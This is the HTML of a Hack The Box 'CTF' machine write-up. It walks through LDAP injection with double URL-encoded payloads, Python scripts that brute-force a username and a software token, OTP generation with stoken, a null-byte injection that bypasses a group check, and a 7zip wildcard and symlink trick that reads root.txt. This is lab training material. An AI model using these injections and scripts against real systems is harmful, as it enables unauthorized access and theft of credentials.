+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: CTF</span></span></code></pre></div></div>
+
+<h2 class="relative group">Website
+    <div id="website" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#website" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Navigating to <code>http://10.10.10.122</code>, we get this page telling us about a token-based (software tokens specifically) authentication system to be tested:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/homepage.png" alt="" />
+  
+  <figcaption>Home Page</figcaption>
+  </figure>
+<p>We are also informed that bruteforcing attempts may result in a 5 minute ban. Banned ip will be available at <code>/status.php</code>:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/status.php.png" alt="" />
+  
+  <figcaption>List of banned IPs</figcaption>
+  </figure>
+<p>We have a login page at <code>/login.php</code>:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/loginpage.png" alt="" />
+  
+  <figcaption>Login page</figcaption>
+  </figure>
+<p>If we try basic credentials such as <code>admin:1234</code>, we get the following response:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/admin_not_found.png" alt="" />
+  
+  <figcaption>Response for admin:1234</figcaption>
+  </figure>
+<p>Looking at the source page, we see the following comment under the OTP input field:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/source_page_comment.png" alt="" />
+  
+  <figcaption>Comment in the login page source</figcaption>
+  </figure>
+<p>Knowing that the token string is stored in an &ldquo;attribute&rdquo;, we can make the assumption that the authentication system is based on LDAP.</p>
+
+<h3 class="relative group">Testing for LDAP Injection
+    <div id="testing-for-ldap-injection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#testing-for-ldap-injection" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Testing for LDAP Injection would help us validate our hypothesis that the website is using LDAP and potentially bypass the authentication system.</p>
+<p>First, we can try to send characters that are specific to LDAP&rsquo;s syntax. For example, the <code>*</code> (wilcard) character:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/wc_char_noenc.png" alt="" />
+  
+  <figcaption>Sending the * character with no encoding</figcaption>
+  </figure>
+<p>Sending the <code>*</code> character does not return any error message. This indicates that some characters are maybe filtered before reaching the application logic.</p>
+<p>If that&rsquo;s the case we can try URL-encoding them:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/wc_char_enc1.png" alt="" />
+  
+  <figcaption><ul>
+<li>character URL-encoded once</li>
+</ul>
+</figcaption>
+  </figure>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/wc_char_enc2.png" alt="" />
+  
+  <figcaption><ul>
+<li>character double URL-encoded</li>
+</ul>
+</figcaption>
+  </figure>
+<p>When we double URL-encoded our payload, we got a different response: &ldquo;Cannot login&rdquo;.</p>
+<p>Earlier, when we tried admin we got the response: &ldquo;User admin not found&rdquo;</p>
+<p>This means we got a valid user by using the <code>*</code> character. Knowing this, and leveraging the difference between the 2 responses, we can retrieve a username character by character.</p>
+
+<h3 class="relative group">Username enumeration
+    <div id="username-enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#username-enumeration" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>This is how we&rsquo;ll retrieve the username:</p>
+<ul>
+<li>First we send <code>a*</code> as the username. If we get the message &ldquo;Cannot login&rdquo;, then we know that the first letter is &lsquo;a&rsquo;. If we don&rsquo;t, we move on to the letter &lsquo;b&rsquo; by sending <code>b*</code>, so on and so forth.</li>
+<li>Let&rsquo;s say that we confirmed that the first letter is &lsquo;a&rsquo;. Now we repeat the process for the second letter by sending <code>aa*</code></li>
+<li>We repeat this process until we get the full username.</li>
+</ul>
+<p>For this, we can use this python script:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">letters</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://10.10.10.122/login.php&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">guess_next_char</span><span class="p">(</span><span class="n">current_guessed_string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;inputUsername&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">current_guessed_string</span><span class="si">}{</span><span class="n">letter</span><span class="si">}</span><span class="s2">%2a&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;inputOTP&#34;</span><span class="p">:</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Cannot login&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">letter</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;END&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">+=</span> <span class="n">guess_next_char</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">username</span><span class="p">)</span></span></span></code></pre></div></div>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/ldapuser_guess.png" alt="" />
+  
+  <figcaption>Script running</figcaption>
+  </figure>
+<p>The script returned the username <code>ldapuser</code>. We can confirm it by trying it on the login page:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/confirm_ldapuser.png" alt="" />
+  
+  <figcaption>Confirmation</figcaption>
+  </figure>
+<p>Now that we have a valid username, we need to know the OTP.</p>
+<p>Referring to the comment we found earlier, the token is stored in one of the attribute. However we don&rsquo;t know which one that is. We can use the LDAP injection in order to fuzz for different attributes and see which one contains the token.</p>
+
+<h3 class="relative group">Attribute enumeration
+    <div id="attribute-enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#attribute-enumeration" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>We can use <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt"  target="_blank" rel="noreferrer">this LDAP attributes wordlist</a> from PayloadsAllTheThings:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">c
+</span></span><span class="line"><span class="cl">cn
+</span></span><span class="line"><span class="cl">co
+</span></span><span class="line"><span class="cl">commonName
+</span></span><span class="line"><span class="cl">dc
+</span></span><span class="line"><span class="cl">facsimileTelephoneNumber
+</span></span><span class="line"><span class="cl">givenName
+</span></span><span class="line"><span class="cl">gn
+</span></span><span class="line"><span class="cl">homePhone
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">jpegPhoto
+</span></span><span class="line"><span class="cl">l
+</span></span><span class="line"><span class="cl">mail
+</span></span><span class="line"><span class="cl">mobile
+</span></span><span class="line"><span class="cl">name
+</span></span><span class="line"><span class="cl">o
+</span></span><span class="line"><span class="cl">objectClass
+</span></span><span class="line"><span class="cl">ou
+</span></span><span class="line"><span class="cl">owner
+</span></span><span class="line"><span class="cl">pager
+</span></span><span class="line"><span class="cl">password
+</span></span><span class="line"><span class="cl">sn
+</span></span><span class="line"><span class="cl">st
+</span></span><span class="line"><span class="cl">surname
+</span></span><span class="line"><span class="cl">uid
+</span></span><span class="line"><span class="cl">username
+</span></span><span class="line"><span class="cl">userPassword</span></span></code></pre></div></div>
+<p>Assuming that the LDAP logic in the backend looks like the following:</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-ldap" data-lang="ldap">(&amp;
+  (username=&lt;USERINPUT&gt;)
+  (otp=&lt;USERINPUT&gt;)
+)</code></pre></div>
+<p>We can try to breakout of one of the conditions and add our own which will contain the attribute we are testing the existence of.</p>
+<p>This can be done by sending something like <code>ldapuser)(attribute=*</code> as the username (double URL-encoded).</p>
+<p>This will then result in the following &ldquo;hypothetical&rdquo; query:</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-ldap" data-lang="ldap">(&amp;
+  (username=ldapuser)
+  (attribute=*)
+  (otp=&lt;USERINPUT&gt;)
+)</code></pre></div>
+<p>If the attribute doesn&rsquo;t exist we won&rsquo;t get the &ldquo;Cannot login&rdquo; error message.</p>
+<p>Using burp intruder, we can fuzz every attribute in our wordlist and see for which ones we get &ldquo;Cannot login&rdquo; in the response</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/attribute_fuzzing_intruder.png" alt="" />
+  
+  <figcaption>Setting up Burp Intruder</figcaption>
+  </figure>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/valid_attributes.png" alt="" />
+  
+  <figcaption>Valid LDAP attributes</figcaption>
+  </figure>
+<p>Among this list of valid attributes, <code>pager</code> seems to be a good candidate for containing a 81 digits token. We can verify it by using the same method as we did in the username enumeration.</p>
+
+<h3 class="relative group">Token leak
+    <div id="token-leak" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#token-leak" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>We can use a slightly modified version of the previous script:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">letters</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">digits</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="s2">&#34;1234567890&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://10.10.10.122/login.php&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">guess_next_char</span><span class="p">(</span><span class="n">current_guessed_string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">digit</span> <span class="ow">in</span> <span class="n">digits</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;inputUsername&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;ldapuser%29%28pager%3d</span><span class="si">{</span><span class="n">current_guessed_string</span><span class="si">}{</span><span class="n">digit</span><span class="si">}</span><span class="s2">%2a&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;inputOTP&#34;</span><span class="p">:</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Cannot login&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">digit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;END&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">+=</span> <span class="n">guess_next_char</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span></span></span></code></pre></div></div>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/token_brute_start.png" alt="" />
+  
+  <figcaption>Start of the attack</figcaption>
+  </figure>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/token_brute_end.png" alt="" />
+  
+  <figcaption>Brute Force finished</figcaption>
+  </figure>
+
+<h3 class="relative group">OTP Generation
+    <div id="otp-generation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#otp-generation" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>From the token we obtained previously, we need to generate a valid OTP which we can use to login. For this we can use  the command line tool: <code>stoken</code> (It was mentionned on the home page that the authentication was based on <a href="https://manpages.ubuntu.com/manpages/focal/man1/stoken.1.html"  target="_blank" rel="noreferrer">Software Tokens</a>)</p>
+<blockquote><p>Before running the tool, we need to make sure that our clock is synchronized with the server&rsquo;s or use a time offset</p>
+</blockquote><div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">stoken --token=285449490011372370317401734215712056720371131272577450204172154164546722716756524 --pin=0000</span></span></code></pre></div></div>
+<p>After submitting the login request with the generated OTP, we are redirected to the following page <code>/page.php</code>:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/page.php.png" alt="" />
+  
+  <figcaption>/page.php</figcaption>
+  </figure>
+
+<h3 class="relative group">Command execution
+    <div id="command-execution" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#command-execution" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>If we try to run a command, we receive this error message:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/cmd_error_message.png" alt="" />
+  
+  <figcaption>Cannot run commands</figcaption>
+  </figure>
+<p>This is means that there is a group membership check that is done. So in order to execute commands we&rsquo;ll either have to get access to a more privileged account or somehow bypass the group membership check.</p>
+<p>We can try to do the latter by injecting a NULL byte (<code>0x00</code>) character after closing the ldap query.</p>
+<p>For that we&rsquo;ll first send <code>ldapuser)%00</code> as the username and increase the number of parenthesis until we close the query.</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/null_byte_1.png" alt="" />
+  
+  <figcaption>With 1 parenthesis</figcaption>
+  </figure>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/null_byte_2.png" alt="" />
+  
+  <figcaption>With 2 parenthesis</figcaption>
+  </figure>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/null_byte_3.png" alt="" />
+  
+  <figcaption>With 3 parenthesis</figcaption>
+  </figure>
+<p>So we need 3 parenthesis to close the query. Now, we can try to login with <code>ldapuser)))%00</code> and a valid OTP and see if we bypass the group membership check.</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/null_byte_login.png" alt="" />
+  
+  <figcaption>Login with null byte injection</figcaption>
+  </figure>
+<p>We logged in successfully with the null byte injection.</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/run_cmd_id.png" alt="" />
+  
+  <figcaption>Running the &lsquo;id&rsquo; command</figcaption>
+  </figure>
+<p>Now we are able to run commands, we can therefore get a reverse shell:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/revshell_cmd.png" alt="" />
+  
+  <figcaption>Executing the reverse shell</figcaption>
+  </figure>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/revshell_caught.png" alt="" />
+  
+  <figcaption>Catching the reverse shell</figcaption>
+  </figure>
+
+<h2 class="relative group">Privesc
+    <div id="privesc" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privesc" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+
+<h3 class="relative group">apache -&gt; ldapuser
+    <div id="apache---ldapuser" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#apache---ldapuser" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Looking at the files of the website, we find credentials for <code>ldapuser</code> in <code>/var/www/html/login.php</code>:</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="/img/htb/ctf/ldapuser_creds.png"
+    ></figure>
+<p>We can use them to login as <code>ldapuser</code> via ssh and retrieve the user flag:</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="/img/htb/ctf/user.txt.png"
+    ></figure>
+
+<h3 class="relative group">ldapuser -&gt; root
+    <div id="ldapuser---root" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ldapuser---root" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Under <code>/backup</code>, we can see different archives with timestamps in their name. Looking at the last modified date, we see they are each separated by a minute.</p>
+<p>This indicates that there might be a cron job running every minute.</p>
+<p>We also have a <code>error.log</code> file running every minute which is empty. And a bash script called <code>honeypot.sh</code>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># get banned ips from fail2ban jails and update banned.txt</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)</span>
+</span></span><span class="line"><span class="cl">/usr/sbin/ipset list <span class="p">|</span> grep fail2ban -A <span class="m">7</span> <span class="p">|</span> grep -E <span class="s1">&#39;[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}&#39;</span> <span class="p">|</span> sort -u &gt; /var/www/html/banned.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># awk &#39;$1=$1&#39; ORS=&#39;&lt;br&gt;&#39; /var/www/html/banned.txt &gt; /var/www/html/testfile.tmp &amp;&amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># some vars in order to be sure that backups are protected</span>
+</span></span><span class="line"><span class="cl"><span class="nv">now</span><span class="o">=</span><span class="k">$(</span>date +<span class="s2">&#34;%s&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">filename</span><span class="o">=</span><span class="s2">&#34;backup.</span><span class="nv">$now</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">pass</span><span class="o">=</span><span class="k">$(</span>openssl passwd -1 -salt 0xEA31 -in /root/root.txt <span class="p">|</span> md5sum <span class="p">|</span> awk <span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># keep only last 10 backups</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /backup
+</span></span><span class="line"><span class="cl">ls -1t *.zip <span class="p">|</span> tail -n +11 <span class="p">|</span> xargs rm -f
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># get the files from the honeypot and backup &#39;em all</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/html/uploads
+</span></span><span class="line"><span class="cl">7za a /backup/<span class="nv">$filename</span>.zip -t7z -snl -p<span class="nv">$pass</span> -- *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># cleaup the honeypot</span>
+</span></span><span class="line"><span class="cl">rm -rf -- *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># comment the next line to get errors for debugging</span>
+</span></span><span class="line"><span class="cl">truncate -s <span class="m">0</span> /backup/error.log</span></span></code></pre></div></div>
+<p>Essentially this script will use 7zip to backup the contents of the <code>/var/www/html/uploads</code> directory. However the command uses a wildcard. We can use this in order to read files we don&rsquo;t have read access for.</p>
+<p>That is possible because with 7zip we can provide listfiles as arguments like this:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7z @myfile</span></span></code></pre></div></div>
+<p>Then 7zip will get the file with the name <code>myfile</code> and read its content. This file should contain a list of all the files we want to archive. It could look like this:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">file1.pdf
+</span></span><span class="line"><span class="cl">secret.txt</span></span></code></pre></div></div>
+<p>In the case where <code>myfile</code> is a symbolic link to another file, it is the content of that file that is read instead. In our our example, let&rsquo;s say we have <code>myfile</code> pointing to <code>/root/root.txt</code>. 7zip will consider the content of <code>/root/root.txt</code> as a file to archive, but since there are no files with that name, it will cause an error which will be logged in <code>error.log</code> file, disclosing the content of <code>/root/root.txt</code>.</p>
+<blockquote><p>Note that providing directly the symbolic link (without using listfiles) would not work in this case since the command uses the <code>-snl</code> argument. This will archive the link itself instead of the content of the file that is being pointing at.</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/snl_arg.png" alt="" />
+  
+  <figcaption>-snl argument</figcaption>
+  </figure>
+</blockquote><p>Another problem is that the <code>error.log</code> file is cleaned up after each execution. But we can use the <code>tail</code> command to monitor it for any changes:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tail -f error.log</span></span></code></pre></div></div>
+<p>So in one terminal we&rsquo;ll create (as the user <code>apache</code>) two files:</p>
+<ul>
+<li><code>@myfile</code></li>
+<li><code>myfile</code> which is a link to the file we want to read, in this case <code>/root/root.txt</code></li>
+</ul>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/symlink.png" alt="" />
+  
+  <figcaption>Creating necessary files</figcaption>
+  </figure>
+<p>And in the second terminal (as <code>ldapuser</code>), we monitor the changes on <code>error.log</code>.</p>
+<p>After a few seconds, we get the root flag in the second terminal:</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/img/htb/ctf/root.txt.png" alt="" />
+  
+  <figcaption>Root flag obtained!</figcaption>
+  </figure>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/writeups/oouch/">
+              <span class="leading-6">
+                HTB - Oouch&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2025-05-10T00:00:00&#43;00:00">10 May 2025</time>
+              </span>
+            
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      
+      
+        
+          
+          
+      
+      
+      
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
+        <ul class="flex list-none flex-col sm:flex-row">
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/tags/"
+                title="Tags">
+                
+                Tags
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          squ4r00t
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
